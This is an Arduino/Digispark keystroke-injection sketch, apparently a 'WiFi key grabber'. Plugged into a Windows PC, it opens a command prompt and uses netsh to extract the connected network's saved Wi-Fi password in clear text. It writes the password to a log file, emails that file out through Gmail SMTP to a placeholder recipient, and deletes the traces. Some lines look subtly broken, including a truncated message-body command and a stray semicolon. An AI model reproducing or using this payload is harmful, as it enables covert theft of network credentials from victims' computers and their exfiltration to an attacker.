#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=:\" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");
DigiKeyboard.println("set A=\"%A:~1%\"");
DigiKeyboard.println("netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt");

DigiKeyboard.println("for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A");

DigiKeyboard.println("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A");
DigiKeyboard.println("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A");
DigiKeyboard.println("del A.txt");
DigiKeyboard.println("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt");
DigiKeyboard.println("powershell");
DigiKeyboard.println("$SMTPServer = 'smtp.gmail.com'");
DigiKeyboard.println("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
DigiKeyboard.println("$SMTPInfo.EnableSsl = $true");
DigiKeyboard.println("$SMTPInfo.Credentials = New-Object ;System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')");
DigiKeyboard.println("$ReportEmail = New-Object System.Net.Mail.MailMessage");
DigiKeyboard.println("$ReportEmail.From = 'ACCOUNT@gmail.com'");
DigiKeyboard.println("$ReportEmail.To.Add('RECEIVER@gmail.com')");
DigiKeyboard.println("$ReportEmail.Subject = 'WiFi key grabber'");
DigiKeyboard.println("$ReportEmail.Body = (Get-Content Log.txt | out-");
DigiKeyboard.println("$SMTPInfo.Send($ReportEmail)");
//DigiKeyboard.println("exit");
DigiKeyboard.println("del Log.txt & exit");
  DigiKeyboard.delay(100);

  for(; ; );
}
